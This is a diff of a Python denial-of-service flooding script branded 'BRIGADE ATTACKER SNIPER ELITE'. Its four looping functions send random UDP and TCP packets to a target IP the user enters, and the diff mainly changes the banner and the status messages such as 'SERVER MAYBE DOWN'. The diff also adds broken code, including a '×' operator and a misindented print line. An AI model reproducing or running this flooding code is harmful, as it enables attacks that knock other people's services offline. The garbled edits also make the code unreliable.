@@ -42,8 +42,8 @@ logo = """
        ░▒ ░       ░      ░       ▒░ ░         ░ ▒░         ▒░▒░  
         ▒░          ░   ░          ░            ░            ░  
 ╔══════════════════════════════════════════════════════════════╗
-
-
+                     BRIGADE ATTACKER SNIPER ELITE
+                  FREEDOM IS THE RIGHT OF ALL NATIONS
 ╚══════════════════════════════════════════════════════════════╝
 """
 faded_text = fade.fire(logo)
@@ -67,7 +67,7 @@ times = int(input("\033[34m Time : \033[0m"))
 threads = int(input("\033[33m Threads : \033[0m"))
 def run():
 	data = random._urandom(1024)
-	i = random.choice(("[+]","[!]","[*]"))
+	i = random.choice(("[+]","[*]","[!]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -76,11 +76,11 @@ def run():
 				s.sendto(data,addr)
 			print(i +" \033[33mBASE2  \033[31mHTTP flood  \033[36m" +str(ip)+ " \033[0m")
 		except:
-			print("[!] Error!!!")
+			print("[!] \033[94mBASE2 \033[31mSERVER \033[96mMAYBE \033[31mDOWN..!! \033[0m")
 
 def run2():
 	data = random._urandom(999)
-	i = random.choice(("[+]","[!]","[*]"))
+	i = random.choice(("[+]","[*]","[!]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -88,15 +88,16 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" \033[33mBASE2  \033[94mHTTPS flood"  +str(ip)+ " \033[0m")
+			print(i *" \033[33mBASE2  \033[94mHTTPS flood"  +str(ip)+ " \033[0m")
 		except:
 			s.close()
-			print("[!] Error!!!")
+			print("[!] \033[94mBASE2 \033[31mSERVER \033[96mMAYBE \033[31mDOWN..!! \033[0m")
+			
             
 
 def run3():
 	data = random._urandom(818)
-	i = random.choice(("[+]","[!]","[#]"))
+	i = random.choice(("[+]","[×]","[!]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -104,15 +105,16 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"\033[92mBASE2 \033[92mAttack sent \033[31m" +str(ip)+ "\033[0m")
+			print(i ×"\033[92mBASE2 \033[92mAttack sent \033[31m" +str(ip)+ "\033[0m")
 		except:
 			s.close()
-			print("[*] Error!!!")
+			print("[!] \033[94mBASE2 \033[31mSERVER \033[96mMAYBE \033[31mDOWN..!! \033[0m")
+			
             
   
 def run4():
 	data = random._urandom(16)
-	i = random.choice(("[*]","[!]","[#]"))
+	i = random.choice(("[*]","[×]","[!]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -120,10 +122,11 @@ def run4():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"Attack Sent!!!")
+		        print(i ×"\033[92mBASE2 \033[92mAttack sent \033[31m" +str(ip)+ "\033[0m")
 		except:
 			s.close()
-			print("[*] Error!!!")
+			print("[!] \033[94mBASE2 \033[31mSERVER \033[96mMAYBE \033[31mDOWN..!! \033[0m")
+				
 											
             
 for y in range(threads):
